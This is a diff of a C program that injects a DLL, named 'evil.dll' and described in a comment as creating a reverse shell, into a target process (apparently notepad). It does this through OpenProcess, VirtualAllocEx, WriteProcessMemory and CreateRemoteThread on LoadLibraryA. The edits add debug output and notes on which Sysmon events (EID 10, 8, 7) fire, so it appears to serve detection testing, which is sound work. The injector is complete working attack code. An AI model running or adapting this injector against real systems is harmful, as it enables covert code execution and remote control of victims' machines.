@@ -1,8 +1,7 @@
-// Create rev shell in evil.dll
+// create revshell in evil.dll
 #include "common.h"
 
 int main() {
-    // Path to malicious DLL on target system
     const char* dllPath = "C:\\Temp\\evil.dll";
     SIZE_T dllPathLen = strlen(dllPath) + 1;
 
@@ -14,25 +13,26 @@ int main() {
     wprintf(L"[*] Target PID: %lu\n", pid);
 
     // Minimum rights for DLL injection
-    // No PROCESS_CREATE_THREAD needed if using LoadLibrary trick
-    HANDLE hProc = OpenProcess(
-        PROCESS_VM_WRITE         |
-        PROCESS_VM_OPERATION     |
-        PROCESS_CREATE_THREAD    |
-        PROCESS_QUERY_LIMITED_INFORMATION,
-        FALSE, pid
-    );
+    DWORD accessMask = PROCESS_VM_WRITE          |
+                       PROCESS_VM_OPERATION      |
+                       PROCESS_CREATE_THREAD     |
+                       PROCESS_QUERY_LIMITED_INFORMATION;
+
+    // Debug — print exact requested mask
+    wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);
+
+    // EID 10 fires here — GrantedAccess 0x102a
+    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
     if (!hProc) {
         wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
         return 1;
     }
-    wprintf(L"[+] Handle acquired — requested 0x143a\n");
+    wprintf(L"[+] Handle acquired\n");
 
-    // Allocate memory for DLL path string in remote process
     LPVOID remoteMem = VirtualAllocEx(
         hProc, NULL, dllPathLen,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE          // RW only — path string not shellcode
+        PAGE_READWRITE
     );
     if (!remoteMem) {
         wprintf(L"[-] VirtualAllocEx failed\n");
@@ -40,7 +40,6 @@ int main() {
     }
     wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
 
-    // Write DLL path string into remote process
     SIZE_T written = 0;
     if (!WriteProcessMemory(hProc, remoteMem, dllPath, dllPathLen, &written)) {
         wprintf(L"[-] WriteProcessMemory failed\n");
@@ -48,8 +47,6 @@ int main() {
     }
     wprintf(L"[+] DLL path written: %zu bytes\n", written);
 
-    // Get address of LoadLibraryA in kernel32.dll
-    // Same address in all processes due to ASLR shared mapping
     LPVOID loadLibAddr = (LPVOID)GetProcAddress(
         GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
     );
@@ -59,13 +56,11 @@ int main() {
     }
     wprintf(L"[+] LoadLibraryA at: 0x%p\n", loadLibAddr);
 
-    // Create remote thread starting at LoadLibraryA
-    // with DLL path as argument
-    // EID 8 fires — but StartModule shows kernel32.dll not -
+    // EID 8 fires here — StartModule: kernel32.dll
     HANDLE hThread = CreateRemoteThread(
         hProc, NULL, 0,
         (LPTHREAD_START_ROUTINE)loadLibAddr,
-        remoteMem,              // argument = DLL path string
+        remoteMem,
         0, NULL
     );
     if (!hThread) {
@@ -73,8 +68,9 @@ int main() {
         return 1;
     }
     wprintf(L"[+] Remote thread created\n");
-    wprintf(L"[*] EID 8 StartModule should show kernel32.dll not -\n");
+    wprintf(L"[*] EID 8 StartModule should show kernel32.dll\n");
     wprintf(L"[*] EID 7 should fire when DLL loads into notepad\n");
+    wprintf(L"[*] EID 10 should show 0x102a for injector→notepad\n");
 
     WaitForSingleObject(hThread, 5000);
     CloseHandle(hThread);
